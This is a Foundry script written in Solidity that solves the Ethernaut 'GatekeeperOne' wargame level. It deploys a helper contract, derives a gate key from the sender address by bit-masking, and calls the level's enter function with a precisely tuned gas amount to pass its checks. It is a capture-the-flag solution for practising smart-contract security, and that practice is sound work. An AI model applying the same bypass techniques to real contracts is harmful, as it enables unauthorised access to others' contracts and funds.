// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/GatekeeperOne/GatekeeperOne.sol";

// Copy address instance from Ethernaut:
address constant LEVEL_INSTANCE = 0xd48F668eB36Cc23bdFBfcac91F2E4fD1a69C46d8;

contract Entrant {
    GatekeeperOne gk1;
    // event EntrantAddress(address _addr);

    constructor(address _gk1) public {
        gk1 = GatekeeperOne(_gk1);
    }

    function enter(bytes8 _gateKey, uint256 gasToSpend) public {
        gk1.enter{gas: gasToSpend}(_gateKey);
    }

    function entrant() public view returns (address) {
        address entrant = gk1.entrant();
        // emit EntrantAddress(entrant);
        return entrant;
    }
}

contract GatekeeperOneScript is Script {
    function setUp() public {}

    function run() public {
        console.log(" # Running Level 13 Script");
        console.log(" |- msg.sender: ", msg.sender);

        bytes8 gatekey = bytes8(
            uint64(uint160(msg.sender)) & 0xffffffff0000ffff
        );
        // Calculated gas used with debugging tool in Remix
        // uint256 gasToSpend = 8191 + 254; // Minimum (8445) doesn't work because SSTORE needs 20k gas when initial state is 0x00
        uint256 gasToSpend = 8191 * 3 + 254; // Execution spends 254 gas until call to gasleft();


        vm.startBroadcast();

        console.log(" |- Deploying Entrant ...");
        Entrant e = new Entrant(LEVEL_INSTANCE);
        console.log(" |- Entrant Deployed to: ", address(e));

        address entrant = e.entrant();
        console.log(" |- Level entrant: ", entrant);

        // Call enter function to open the gate
        console.log(" |- Calling enter to open the gate");
        e.enter(gatekey, gasToSpend);

        // Check if contract has a new owner
        entrant = e.entrant();
        console.log(" |- Level entrant: ", entrant);

        vm.stopBroadcast();


        // Make sure the gate is open
        require(entrant == msg.sender, " ##### Contract still not pwned! ##### ");
        // require(0==1,"No quiero que bradcastees!");
        console.log(" `- End of Level");
    }
}
